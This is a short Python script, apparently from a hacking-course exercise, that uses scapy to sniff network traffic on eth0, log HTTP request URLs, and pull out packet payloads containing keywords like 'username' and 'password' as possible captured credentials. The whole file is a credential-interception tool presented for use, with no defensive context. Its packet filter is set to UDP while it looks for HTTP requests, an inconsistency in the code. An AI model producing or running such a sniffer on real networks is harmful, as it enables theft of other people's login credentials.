#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    # Store = Whether the data is saved
    # Prn = Which function to call
    # Filter = Can be ports, protocols etc...
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet, filter="udp")

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Host is the domain, path is the "path" inside that domain
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request >> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username / Password >> " + login_info + "\n\n")


sniff("eth0")